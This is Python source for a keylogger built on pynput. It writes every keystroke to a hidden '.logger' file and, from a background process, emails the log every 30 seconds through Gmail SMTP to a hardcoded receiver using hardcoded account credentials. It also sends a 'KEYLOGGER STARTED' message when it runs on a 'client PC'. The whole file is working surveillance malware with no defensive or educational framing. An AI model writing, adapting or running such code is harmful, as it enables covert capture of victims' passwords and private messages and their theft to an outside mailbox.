from pynput import keyboard, mouse
import os
import datetime
import smtplib
import os
import time
from multiprocessing import Process

fileName = '.logger'

def on_press(key):
    # print(datetime.datetime.now().strftime("%H:%M:%S"))
    try:
        f = open(fileName, "a")
        f.write(key.char)
        f.close()
        # print('alphanumeric key {0} pressed'.format(key.char))
        return
    except AttributeError:
        # print('special key {0} pressed'.format(key))
        if key == keyboard.Key.space:
            f.write('|')
            f.close()
            return
        if key == keyboard.Key.enter:
            f.write(os.linesep)
            f.close()
            return
        if key == keyboard.Key.backspace:
            f.write('<-')
            f.close()
            return
        f.write(" --{0}--".format(key))
        f.write(os.linesep)
        f.close()
        return


def on_release(key):
    try:
        if key == keyboard.Key.esc:
            return False
    except AttributeError:
        return True


def logging():
    send_application_start_message()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def emailSending():
    while True:
        send_log()
        time.sleep(30)


gmail_user = 'ozunakeylogger@gmail.com'
receiver = 'juandanielozuna2@gmail.com'
gmail_password = 'ozuna123'

def send_log():
    try:
        if os.path.exists(fileName):
            f = open(fileName, "r")
            contents = f.read()
            f.close()
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(gmail_user, gmail_password)
            subject = "Custom Keylogger Email; {0}".format(datetime.datetime.now().strftime("%b %d %Y %H:%M:%S"))
            message = """Subject: {0}
            \n\n
            {1}
            """.format(subject, contents)
            message = message.encode("ascii", errors="ignore")
            s.sendmail(gmail_user, receiver, message)
            if os.path.exists(fileName):
                os.remove(fileName)
    except:
        print("")


def send_application_start_message():
    startingDate = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(gmail_user, gmail_password)
    message = """Subject: OZUNA KEYLOGGER STARTED
    \n\n
    The purpose of this email is to indicate the the service started in a client PC
    Date of the act: {0}
    """.format(startingDate)
    s.sendmail(gmail_user, receiver, message)


def move_python_files_to_location():
    pth = os.path.dirname(__file__)
    print(pth)

if __name__ == '__main__':
    p2 = Process(target=emailSending)
    p2.start()
    logging()
    p2.join()
